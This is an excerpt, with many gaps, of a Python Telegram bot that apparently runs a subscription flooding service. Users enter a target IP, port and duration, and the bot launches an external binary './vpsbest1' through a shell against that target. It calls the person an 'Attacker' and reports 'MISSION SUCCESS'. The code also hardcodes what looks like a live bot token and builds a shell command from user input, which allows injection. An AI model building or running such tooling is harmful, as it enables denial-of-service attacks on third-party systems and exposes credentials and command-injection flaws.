...
bot = telebot.TeleBot('7818765930:AAHQCwxi9_BpsYFSL0Ak9pmK9Ryx3tcuZ6I')
...
MAX_hard_TIME = 300  # Example: Default maximum hard time set to 300 seconds
...
def log_command(user_id, target, port, hard_time):
...
def start_command(message):
    ...
    hard_button = types.KeyboardButton("🚀 hard")
    ...
    markup.add(hard_button, myinfo_button, redeem_button,  bot_sitting_button)
...
def bot_sitting(message):
    ...
    set_time_button = types.KeyboardButton("🕒 Set hard Time")
...
@bot.message_handler(func=lambda message: message.text == "🕒 Set hard Time")
def prompt_set_hard_time(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔ Access Denied: Admins only.")
        return

    bot.reply_to(message, f"🕒 Enter the new maximum hard time in seconds (current: {MAX_hard_TIME}s):")
    bot.register_next_step_handler(message, process_set_hard_time)

def process_set_hard_time(message):
    global MAX_hard_TIME
    user_id = str(message.chat.id)
    ...
    try:
        ...
        if new_time <= 0:
            ...
            MAX_hard_TIME = new_time
            bot.reply_to(message, f"✅ Maximum hard time updated to {MAX_hard_TIME} seconds!")
    except ValueError:
...
@bot.message_handler(func=lambda message: message.text == "🚀 hard")
def handle_hard(message):
    user_id = str(message.chat.id)
    ...
    if user_id in users and users[user_id]:  # Ensure user has valid expiration
        ...
        if user_id in last_hard_time:
            time_since_last_hard = (datetime.datetime.now() - last_hard_time[user_id]).total_seconds()
            if time_since_last_hard < COOLDOWN_PERIOD:
                remaining_cooldown = COOLDOWN_PERIOD - time_since_last_hard
                response = f"⌛️ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗶𝗻 𝗲𝗳𝗳𝗲𝗰𝘁 𝘄𝗮𝗶𝘁 {int(remaining_cooldown)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
                bot.reply_to(message, response)
                return  # Prevent the hard from proceeding

        # Prompt the user for hard details
        response = "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗶𝗽, 𝗽𝗼𝗿𝘁 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲"
        bot.reply_to(message, response)
        bot.register_next_step_handler(message, process_hard_details)

    else:
        response = "⛔️ 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! ⛔️\n\n OWNER :- !"
        bot.reply_to(message, response)

def process_hard_details(message):
    user_id = str(message.chat.id)
    ...
    if len(details) == 3:
        ...
        try:
            port = int(details[1])
            hard_time = int(details[2])  # ✅ Renamed from 'time' to 'hard_time'

            if hard_time > MAX_hard_TIME:
                response = f"❗️ Error: Maximum allowed hard time is {MAX_hard_TIME} seconds!"
            else:
                # Log the hard with correct variable name
                log_command(user_id, target, port, hard_time)
                full_command = f"./vpsbest1 {target} {port} {hard_time} 9 1000"  # ✅ Correct variable name
                ...
                response = (
                    ...
                    f"𝗧𝗶𝗺𝗲: {hard_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n"
                    f"𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: @{username}"
                )

                # Execute the hard command
                subprocess.Popen(full_command, shell=True)

                # Schedule a message after the hard duration
                threading.Timer(hard_time, send_hard_finished_message, [message.chat.id, message.message_id, target, port, hard_time]).start()

                last_hard_time[user_id] = datetime.datetime.now()
...
def send_hard_finished_message(chat_id, message_id, target, port, hard_time):
    """Notify the user that the hard is finished in a bold and powerful way, with a reply to the hard message."""
    
    message = (
        "🔥 **hard COMPLETED!** 🔥\n\n"
        f"🎯 **TARGET:** **`{target}:{port}`**\n"
        f"⏳ **DURATION:** **`{hard_time} SECONDS`**\n"
        "💀 **STATUS:** **`SUCCESS!`**\n\n"
        "💀 **MISSION SUCCESS!** 💀"
    )
...
if __name__ == "__main__":
    ...
    while True:
        ...
        hard_time = 60  # ✅ Renamed from `time` to avoid conflicts
